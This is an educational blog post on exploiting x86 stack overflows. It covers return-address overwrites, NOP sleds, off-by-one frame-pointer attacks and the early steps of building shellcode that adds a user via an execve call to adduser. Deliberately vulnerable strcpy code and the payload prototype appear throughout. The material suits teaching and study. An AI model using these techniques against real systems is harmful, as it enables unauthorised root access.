+<p>Stack overflows are among the most common buffer overflow vulnerabilities. Already in 1996 Aleph One alias Elias Levy published an article (“Smashing the Stack for Fun and Profit”), which dealt with this kind of overflows in detail. Since not only data but also return addresses are placed on the stack, some security risks can arise in case of stack overflows. It might be possible for an attacker to place executable code on the stack and then manipulate the program flow to execute the introduced code.
+The easiest way for an attacker to exploit a stack overflow vulnerability is to fill the overflow buffer with random data to force a program termination. Such an attack is also known as a Denial of Service (DoS) attack. This can have a devastating effect on network services in particular, as they are no longer accessible in the network in the event of an attack. If a coredump is generated during a program crash, the attacker may be able to draw further important conclusions from it, which could be helpful for the preparation of a more extensive attack.
+However, a DoS attack is often the most harmless option an attacker can choose from.
+The attacker will usually first try to modify the program flow and inject his own code with which he can gain extensive rights over the system, for example. This is particularly easy to achieve with stack overflows. Since the return addresses of the individual functions of the program are stored on the stack, the attacker only has to attempt to manipulate them. For this purpose, the example from the previous section is to be examined again in slightly modified form:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">y</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">buff2</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+	<span class="n">i</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">;</span>
+	<span class="n">strcpy</span><span class="p">(</span><span class="n">buff2</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+ 	<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
+	<span class="n">foo</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+<p><!--- _* --></p>
+
+<p>If the buffer buff2 in the <code class="highlighter-rouge">foo()</code> function is not protected against a buffer overflow, the saved framepoint FP1 and then the return address RIP would be overwritten (see last figure). The attacker’s objective is therefore to overwrite at least the higher addresses of the buffer (and beyond) with an address of his choice. The fact that the saved frame pointer is also overwritten does not need to bother the attacker, since the frame pointer is usually no longer needed in case of a modification of the program flow (a procedure is presented below with which the payload data can be accessed without a frame pointer) or the frame pointer is set to a new value. In the simplest case, the attacker would manipulate the return address in such a way that it then refers to already existing program code, which is normally not executed. This can be interesting, for example, for programs that only execute certain functions after a password has been entered successfully.
+As a second possibility, the attacker could place his own program code in the overflow buffer and let the return address point to this code. A piece of code that is able to manipulate the program flow and execute the introduced code is also known as an exploit. This exploit consists of the two components Injection Vector and Payload. The Injection Vector should force the buffer to overflow and then execute the payload. The payload itself can be designed differently depending on the target of the attacker. Often the payload should open a shell with the rights of the faulty program (often referred to as shellcode, although the term is now also used for other payload functions) or make an entry in a password file. Of course, the payload can also be used to release a virus or install a sniffer.
+However, the creation of the desired payload is usually not trivial. Since this must already exist in the machine code, the attacker requires information about processor architecture, operating system, etc.</p>
+
+<h3 id="the-zero-byte-problem">The Zero Byte Problem</h3>
+<p>A further problem can also arise from the fact that many string functions (especially copy operations) terminate when a null byte is reached in the string. If the faulty program uses such a string function, there must not be a zero byte in the payload. The actual machine commands usually do not consist of zero bytes, but often their operands. For example, if a register is to be loaded with zero, an instruction such as e. g.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">	<span class="n">movl</span> <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span> <span class="err">%</span><span class="n">ebx</span></code></pre></figure>
+
+<p>can be used. Since the operand is a literal, it is placed directly in the code. A direct use of null literals should therefore be avoided if possible in order to guarantee the functionality of the exploit. Instead, other machine commands should be used to set a register to zero.
+The example in the next section explains a way to prevent these null bytes.</p>
+
+<h3 id="relative-addressing">Relative Addressing</h3>
+<p>The payload usually stores data such as strings that are required for execution. To process these data, their absolute addresses are required (relative addressing to the frame pointer is not possible because it is overwritten). However, since the attacker cannot know the exact position of the data on the stack, he must use a small trick to determine the absolute addresses. The following payload structure can be used for this:</p>
+
+<p><img src="/images/2018-02-05-buffer-overflows/relativeAddr.png" alt="" class="image-center" width="400px" /></p>
+
+<p>As you can see in the figure, a CALL instruction is placed directly in front of the payload data, a JMP instruction is the very first statement in the code. When executed, the system would first branch from the JMP statement to the CALL statement. This is possible because with JMP also relative jumps are possible. The CALL instruction is then executed. CALL statements are usually executed when a function is called. The return address of the next instruction is automatically saved to the stack. In our case, there are no longer any instructions after the CALL call, but the data. The CALL instruction therefore saves the absolute address of the data area on the stack. In the next step, this address only has to be fetched from the stack (with POPL %ESI) and can be used later on.
+NOP-sliding
+Often the overflow buffer is considerably larger than the actual payload. Part of the overflow buffer (higher addresses) is overwritten with the desired return address, the rest of the memory would be available to the payload. In order to increase the probability of a successful attack, this remaining memory should be used efficiently.
+First of all, another problem is considered: Normally, the attacker cannot know the exact position (absolute address) of the overflow buffer on the stack, only an estimate is possible. This estimate will usually be quite accurate, since most programs only place a few hundred or thousand bytes on the stack. In order for the payload to be executed successfully, however, the address would have to be determined exactly (this is not possible), because otherwise the system would branch into the middle of the payload or to a completely wrong address.
+At this point we can use the observation that the overflow buffer is often considerably larger than the actual payload. The excess memory can be filled by a block of No Operation (NOP) instructions. This block is followed by the actual payload. If the NOPs block is large enough, a return address can be guessed, which points with a comparatively high probability (depending on the size of this area) into the NOPs block. After the placement of the NOPs statements, the actual payload and return address in the overflow buffer, when the faulty function is exited, it would branch to the NOPs area, go through it and then execute the actual code. This process is also known as NOP-sliding. The exploit should have the following structure:</p>
+
+<p><img src="/images/2018-02-05-buffer-overflows/nop-sliding.png" alt="" class="image-center" width="400px" /></p>
+
+<h2 id="off-by-ones-and-frame-pointer-overwrites">Off-by-Ones and Frame Pointer Overwrites</h2>
+<p>Off-by-One overflows occur when the specified data buffer overflows by one byte. The most common reason for this is that the termination condition of loops is incorrectly formulated. The following example illustrates this:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+<span class="mi">2</span>		<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+<span class="mi">3</span>		<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+<span class="mi">4</span>		<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;=</span><span class="mi">100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="c1">// Here is an error!!!</span>
+<span class="mi">5</span>			<span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+<span class="mi">6</span>	<span class="p">}</span></code></pre></figure>
+
+<p>In the example, the For loop runs from index 0 to 100, so that one element is copied too much into the field buff. Since only 100 bytes have been reserved, a subsequent memory location is overwritten.
+In this example, the array would be created on the stack because buff is a local variable. This does not necessarily have to be the case with all off-by-one-errors, but this error can be easily exploited with arrays on the stack, as this leads to so-called frame pointer overwrites.
+Let’s take another look at the example. If the lines two and three are swapped, this would cause the loop to overwrite the least significant byte (LSB) of variable i, since the processors we are looking at (IA-32/x86) use a little-endian byte representation.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+<span class="mi">2</span>		<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+<span class="mi">3</span>		<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+<span class="mi">4</span>		<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;=</span><span class="mi">100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="c1">// Here is an error!!!</span>
+<span class="mi">5</span>			<span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+<span class="mi">6</span>	<span class="p">}</span></code></pre></figure>
+<p><!--- _* --></p>
+
+<p>In the above example, in the worst case, an infinite loop can occur if the LSB of the counting variable i is overwritten with a value of less or equal to 100. However, the vulnerability cannot be used to manipulate the program flow. This is only possible if the first statement of a function represents the declaration of the buffer.
+As we already know, when entering a function, the current frame pointer is saved to the stack first. The stack then reserves memory space for the local variables. An off-by-one-overflow would therefore result in the LSB of the frame pointer being overwritten. At first glance, this does not seem to be tragic. In fact, the flow of the current function is not disturbed any further, as it is not dependent on the saved frame pointer. However, before returning from the procedure, the LEAVE instruction loads the saved frame pointer into the EBP register. This can lead to some problems in the calling function, for example, because access to local variables occurs relative to the EBP register. To go into more detail, let’s first extend our example above to include a main function that calls the faulty function foo:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">1</span>	<span class="n">void</span> <span class="n">main</span><span class="p">()</span> <span class="err">{</span>
+<span class="mi">2</span>		<span class="n">char</span> <span class="k">str</span><span class="p">[101]</span><span class="c">;</span>
+<span class="mi">3</span>		<span class="n">foo</span><span class="p">(</span><span class="k">str</span><span class="p">)</span><span class="c">;</span>
+<span class="mi">4</span>	<span class="err">}</span>
+
+
+<span class="mi">1</span>	<span class="n">main</span><span class="o">:</span>
+<span class="mi">2</span>        <span class="n">pushl</span>   <span class="err">%</span><span class="n">ebp</span>
+<span class="mi">3</span>        <span class="n">movl</span>    <span class="err">%</span><span class="n">esp</span><span class="p">,</span> <span class="err">%</span><span class="n">ebp</span>
+<span class="mi">4</span>        <span class="n">subl</span>    <span class="err">$</span><span class="mi">120</span><span class="p">,</span> <span class="err">%</span><span class="n">esp</span>
+<span class="mi">5</span>        <span class="n">subl</span>    <span class="err">$</span><span class="mi">12</span><span class="p">,</span> <span class="err">%</span><span class="n">esp</span>
+<span class="mi">6</span>        <span class="n">leal</span>    <span class="o">-</span><span class="mi">120</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span> <span class="err">%</span><span class="n">eax</span>
+<span class="mi">7</span>        <span class="n">pushl</span>   <span class="err">%</span><span class="n">eax</span>
+<span class="mi">8</span>        <span class="k">call</span>    <span class="n">foo</span>
+<span class="mi">9</span>        <span class="n">addl</span>    <span class="err">$</span><span class="mi">16</span><span class="p">,</span> <span class="err">%</span><span class="n">esp</span>
+<span class="mi">10</span>       <span class="k">leave</span>
+<span class="mi">11</span>       <span class="k">ret</span></code></pre></figure>
+<p><!--- _* --></p>
+
+<p>As mentioned above, after calling foo (i. e. in line nine of the assembler code) there is an incorrect value in the EBP register (frame pointer). We will analyze the code of the main function from line 9 onwards.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">9</span> 	<span class="n">addl</span>    <span class="err">$</span><span class="mi">16</span><span class="p">,</span> <span class="err">%</span><span class="n">esp</span></code></pre></figure>
+<p><!--- _* -->
+After the function call, the stack pointer must be adjusted again to remove the passed parameters from the stack. In our case, only a pointer of four bytes was passed. However, since in line 5 memory has been reserved which is not needed, the stack pointer is changed by a considerably larger value.
+10 	leave
+The statement in line 10 can be replaced using the two statements</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">	<span class="n">movl</span> <span class="err">%</span><span class="n">ebp</span><span class="p">,</span> <span class="err">%</span><span class="n">esp</span>
+	<span class="n">popl</span>  <span class="err">%</span><span class="n">ebp</span></code></pre></figure>
+<p><!--- _* -->
+The current frame pointer is loaded into the stack pointer and the previously saved frame pointer is loaded into the EBP register. Normally, the stack pointer would point to the return address of the main function after the LEAVE statement, but this is not the case in our example, since the frame pointer has already been assigned an incorrect value. This fact is therefore reflected in the following instruction:
+11 ret
+The instruction in line 11 can be represented by</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">	<span class="n">popl</span> <span class="err">%</span><span class="n">eip</span></code></pre></figure>
+<p><!--- _* -->
+The return address is loaded into the instruction register by this last instruction. The value that is loaded depends on the position of the stack pointer. Since the stack pointer does not point to the actual return address, an address is loaded that would normally lead to an error and premature termination of the process.
+Let us briefly summarize the findings of this example: An off-by-one-overflow in the <code class="highlighter-rouge">foo()</code> function overwrites the LSB of the saved frame pointer of the main function. When leaving <code class="highlighter-rouge">foo()</code>, an incorrect value is therefore loaded into the frame pointer, which then causes the stack pointer to adopt this incorrect value when leaving the main function and not point to the actual return address. After loading the return address into the instruction register, the process will normally be terminated as there is no valid instruction at the corresponding memory location.
+At this point, of course, the question arises as to whether it might be possible to exploit the vulnerability in such a way that the secured frame pointer is manipulated in a way that a previously introduced program is executed when leaving Main.
+First, let us sketch the structure of the stack for our example.</p>
+
+<p><img src="/images/2018-02-05-buffer-overflows/off-by-one1.png" alt="" class="image-center" width="750px" /></p>
+
+<p>As can be seen in the above graphic, one is able to manipulate the LSB of the secured frame pointer FP1. Of course, it would be most useful if FP1 would point to the memory area of buff, where we could store a return address. The LSB of the secured frame pointer should therefore be as small as possible in our case, so that we can be relatively sure that FP1 will point to the desired range later on.
+But what if the old value of FP1 is already comparatively small? In this case it can happen that even a value of 0 in the LSB of the FP is not sufficient to show in the field buff.
+In our case, it is also aggravating that a relatively large array is created in the main function, so the difference between FP2 and FP1 becomes very large.
+If a certain number of bytes (&gt;247) is placed on the stack in <code class="highlighter-rouge">main()</code>, it is impossible to manipulate the secured frame pointer FP1 in such a way that it points to the memory area of buff. In the example 101 bytes are reserved for the array str, in addition the return address RIP and the frame pointer FP1 are placed on the stack with 4 bytes each. The LSB of the secured frame pointer FP1 must therefore not be smaller than (255 - 101 - 4 - 4 = 146) so that successful manipulation is possible.
+In summary, it can be said that a successful manipulation of the secured frame pointer in the called function becomes the more likely the fewer bytes are placed on the stack by the calling function and the smaller the value of the LSB of the secured FP is.
+In the following we assume that it is possible to manipulate the saved frame pointer successfully, so FP1 can point to the memory area of buff.
+In order to execute a program successfully, you should assign the following value to our input buffer, which is copied to buff (blue highlighted area):</p>
+
+<p><img src="/images/2018-02-05-buffer-overflows/off-by-one2.png" alt="" class="image-center" width="750px" /></p>
+
+<p>The payload address is chosen so that it points to the NOPs area.
+We expect that after manipulation of the LSB of the secured frame pointer FP1, it will point to the region of the payload address. When leaving the main function, this address would be loaded into the instruction register and finally the payload would be executed.</p>
+
+<h3 id="bug-of-the-gcc-compiler">Bug of the GCC compiler</h3>
+<p>Testing an exploit that was supposed to exploit this off-by-one vulnerability caused an unexpected problem that ultimately turned out to be a bug of the GNU compiler GCC 3.x.  For clarification, the assembler code of the following function should be provided:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+<span class="mi">2</span>		<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+<span class="mi">3</span>	<span class="p">}</span></code></pre></figure>
+<p><!--- _* -->
+Output of the compiler:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">1</span> <span class="n">foo</span><span class="o">:</span>
+<span class="mi">2</span>        <span class="n">pushl</span>   <span class="err">%</span><span class="n">ebp</span>
+<span class="mi">3</span>        <span class="n">movl</span>    <span class="err">%</span><span class="n">esp</span><span class="p">,</span> <span class="err">%</span><span class="n">ebp</span>
+<span class="mi">4</span>        <span class="n">subl</span>    <span class="err">$</span><span class="mi">120</span><span class="p">,</span> <span class="err">%</span><span class="n">esp</span>
+<span class="mi">5</span>        <span class="k">leave</span>
+<span class="mi">6</span>        <span class="k">ret</span></code></pre></figure>
+<p><!--- _* --></p>
+
+<p>In line 4 of the assembler code 120 bytes are reserved for the array buff, but according to the C-code the array should be only 100 bytes in size. So, a whole 20 bytes are reserved in excess. Also with other buffer sizes, in almost all cases more memory was allocated than actually necessary. This compiler bug makes it impossible to exploit off-by-one vulnerabilities. In order to achieve a useful result, the For loop termination condition of the foo function has been modified to overwrite the LSB of the saved frame pointer. The corresponding C source code of the example can be found on GitHub.</p>
+
+<h1 id="detailed-example-for-the-creation-of-an-exploit">Detailed Example for the Creation of an Exploit</h1>
+<h2 id="basic-principles">Basic Principles</h2>
+<p>After discussing classic stack overflows in detail, a somewhat more extensive exploit will be developed here, which uses a buffer overflow vulnerability to create a user with root privileges. The prerequisite for accessing the “useradd” program is first of all that the faulty program has been started with extended (root) privileges. The faulty program should be network-compatible so that an attack can be carried out by an external computer. Further details are not to be discussed here, the extensively commented source code of the programs is to be found on GitHub.
+The following vulnerability was identified in the source code:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">calc</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+	<span class="n">strcpy</span> <span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+<p><!--- _* -->
+After the input of the external host has been read, the calc function is called and the input is passed.
+In the calc function, a buffer with a length of 512 bytes is created, then the transferred string is copied into this buffer. Since there are no checks for out-of-range checks, an attacker can easily create a buffer overflow.
+For example, in a simple DoS attack, the attacker can make an arbitrary entry with a length of &gt;512 bytes, which should cause the program to crash.
+Because the program was executed with root privileges, it is particularly easy for the attacker to execute malicious code on the target system if he succeeds in taking over the rights of the process. The buffer size of 512 bytes allows to store the code to be executed directly in the buffer, and NOP-sliding can also be used without any problems, which dramatically increases the chances of a successful attack.
+It is also known that the target system has an IA-32/x86 processor.
+The introduced code must be available as machine code. To obtain this native code, some steps are necessary, which are described below:</p>
+<ol>
+  <li>Implementation of the desired functions in a C program</li>
+  <li>Analysis of the disassembled C program</li>
+  <li>Development of an own assembler program</li>
+  <li>Assembling your own program and extracting the machine code</li>
+  <li>Creation of a fully functional exploit</li>
+</ol>
+
+<h2 id="implementation-of-the-desired-functions-using-a-c-program">Implementation of the desired Functions using a C Program</h2>
+<p>In our case, a standard user should be created on the target system for simplicity’s sake. Later a user with root privileges should be created.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+<span class="mi">2</span>	   <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
+<span class="mi">3</span>	   <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/usr/sbin/adduser"</span><span class="p">;</span>
+<span class="mi">4</span>	   <span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">"markus"</span><span class="p">;</span>
+<span class="mi">5</span>	   <span class="n">name</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">"-p"</span><span class="p">;</span>
+<span class="mi">6</span>	   <span class="n">name</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s">"$1$7ÏvÙLKÏµ$gSUKG6RALzRA8ryROcTsG0"</span><span class="p">;</span>
+<span class="mi">7</span>	   <span class="n">name</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="mi">8</span>	   <span class="n">execve</span><span class="p">(</span><span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">name</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="mi">9</span>	<span class="p">}</span></code></pre></figure>
+<p><!--- _* --></p>
+
+<p>This program creates a user “markus” with the corresponding password. The password must already exist in encrypted form (name[3]).
+The parameter list is prepared in lines 2-7, which is passed to the execve function in line 8. This parameter list is a list of null-terminated strings, the parameter list itself must be terminated with a NULL pointer.
+The execve function is a kernel system function that replaces the current program code in memory with a new program code. The first parameter expected is the path of the file to be executed. The second parameter is the parameter list that is passed to the main function of the program to be executed.</p>
+
+<h2 id="analysis-of-the-disassembled-c-program">Analysis of the disassembled C Program</h2>
+<p>After the C source code has been generated, the output of the GCC compiler can be examined in more detail. First, the assembler code of the main function will be examined.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">main</span><span class="o">:</span>
+<span class="mi">1</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">ebp</span>				
+<span class="mi">2</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">esp</span><span class="p">,</span><span class="err">%</span><span class="n">ebp</span>			
+<span class="mi">3</span>	<span class="k">sub</span>    <span class="err">$</span><span class="mh">0x28</span><span class="p">,</span><span class="err">%</span><span class="n">esp</span>			
+<span class="mi">4</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x808dbe0</span><span class="p">,</span><span class="mh">0xffffffd8</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">)</span>
+<span class="mi">5</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x808dbf2</span><span class="p">,</span><span class="mh">0xffffffdc</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">)</span>
+<span class="mi">6</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x808dbf9</span><span class="p">,</span><span class="mh">0xffffffe0</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">)</span>
+<span class="mi">7</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x808dc00</span><span class="p">,</span><span class="mh">0xffffffe4</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">)</span>
+<span class="mi">8</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0xffffffe8</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">)</span>		
+<span class="mi">9</span>	<span class="k">sub</span>    <span class="err">$</span><span class="mh">0x4</span><span class="p">,</span><span class="err">%</span><span class="n">esp</span>			
+<span class="mi">10</span>	<span class="k">push</span>   <span class="err">$</span><span class="mh">0x0</span>				
+<span class="mi">11</span>	<span class="k">lea</span>    <span class="mh">0xffffffd8</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>		
+<span class="mi">12</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">eax</span>				
+<span class="mi">13</span>	<span class="n">pushl</span>  <span class="mh">0xffffffd8</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">)</span>			
+<span class="mi">14</span>	<span class="k">call</span>   <span class="mh">0x804cac0</span> <span class="o">&lt;</span><span class="n">__execve</span><span class="o">&gt;</span>		
+<span class="mi">15</span>	<span class="k">add</span>    <span class="err">$</span><span class="mh">0x10</span><span class="p">,</span><span class="err">%</span><span class="n">esp</span>
+<span class="mi">16</span>	<span class="k">leave</span>
+<span class="mi">17</span>	<span class="k">ret</span></code></pre></figure>
+<p><!--- _*__ --></p>
+
+<p>Let’s start the analysis with two already well-known instructions:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">1</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">ebp</span>				
+<span class="mi">2</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">esp</span><span class="p">,</span><span class="err">%</span><span class="n">ebp</span></code></pre></figure>
+<p><!--- _* -->
+When you enter the main function, the old frame pointer is first saved and then overwritten with the stack pointer.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">3</span>	<span class="k">sub</span>    <span class="err">$</span><span class="mh">0x28</span><span class="p">,</span><span class="err">%</span><span class="n">esp</span>			
+<span class="mi">4</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x808dbe0</span><span class="p">,</span><span class="mh">0xffffffd8</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">)</span>
+<span class="mi">5</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x808dbf2</span><span class="p">,</span><span class="mh">0xffffffdc</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">)</span>
+<span class="mi">6</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x808dbf9</span><span class="p">,</span><span class="mh">0xffffffe0</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">)</span>
+<span class="mi">7</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x808dc00</span><span class="p">,</span><span class="mh">0xffffffe4</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">)</span>
+<span class="mi">8</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0xffffffe8</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">)</span>		</code></pre></figure>
+<p><!--- _*__ --></p>
+
+<p>In line three, 40 bytes are reserved for the local variables. As can be seen from the C code, however, only a field of five pointers is created, the GCC compiler reserves 20 bytes extra. This can be traced back to the bug of the GCC 3.X compiler, which in our case is no longer tragic. In lines four to eight, the addresses of the string literals are written to the previously reserved region. The string literals are constants that are stored in the data segment of the program.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">9</span>	<span class="k">sub</span>    <span class="err">$</span><span class="mh">0x4</span><span class="p">,</span><span class="err">%</span><span class="n">esp</span></code></pre></figure>
+<p><!--- _*__ -->
+In line nine another four bytes are reserved on the stack, but the sense of this instruction does not seem to be clear.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">10</span>	<span class="k">push</span>   <span class="err">$</span><span class="mh">0x0</span>				
+<span class="mi">11</span>	<span class="k">lea</span>    <span class="mh">0xffffffd8</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>		
+<span class="mi">12</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">eax</span>				
+<span class="mi">13</span>	<span class="n">pushl</span>  <span class="mh">0xffffffd8</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">)</span>					</code></pre></figure>
+<p><!--- _*__ -->
+The three parameters of the execv function are then placed on the stack. Make sure that this is done in the reverse order, i. e. that the last parameter is placed on the stack first. Therefore, the parameter NULL is placed on the stack first. Next, the address of the first pointer must be determined in line eleven (this corresponds to the second parameter of the function). In the last step, the address of the string literal name[0] = “/usr/sbin/adduser” is placed on the stack.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">14</span>	<span class="k">call</span>   <span class="mh">0x804cac0</span> <span class="o">&lt;</span><span class="n">__execve</span><span class="o">&gt;</span></code></pre></figure>
+<p><!--- _*__ -->
+The CALL instruction places the return address on the stack and then branches to the <code class="highlighter-rouge">execve()</code> sub-function. If the <code class="highlighter-rouge">execve()</code> function is executed successfully, it will not return (the current program code is replaced by a new one). Should it still return to <code class="highlighter-rouge">main()</code> in case of an error, the following lines will be executed:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">15</span>	<span class="k">add</span>    <span class="err">$</span><span class="mh">0x10</span><span class="p">,</span><span class="err">%</span><span class="n">esp</span>
+<span class="mi">16</span>	<span class="k">leave</span>
+<span class="mi">17</span>	<span class="k">ret</span></code></pre></figure>
+<p><!--- _*__ -->
+Some cleanup work is done on the stack and finally <code class="highlighter-rouge">main()</code> is left.
+The next step is to examine the system function <code class="highlighter-rouge">execve()</code> in more detail. This is much more difficult than analyzing <code class="highlighter-rouge">main()</code>. Before doing so, however, it is advisable to sketch the stack. The memory that is allocated too much should not be taken into account.</p>
+
+<p><img src="/images/2018-02-05-buffer-overflows/example1.png" alt="" class="image-center" width="750px" /></p>
+
+<p>It is important that the name is not a pointer to one of the string literals, but a pointer to the pointer name[0]. But why do you need a pointer to a pointer? The answer is relatively simple: the program useradd, which is called later, contains a main function to which parameters can be passed. The function header will look something like this:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{....</span> <span class="p">}</span></code></pre></figure>
+<p><!--- _*__ ** -->
+This function header is used if you want to pass a list of arguments to the program. The *argv[] is also a pointer to another pointer, namely the pointer to the pointer of the first argument. In our case, the pointer name assumes exactly the same function. In fact, it is exactly this pointer that will later be handed over to the main function of the “useradd” program.
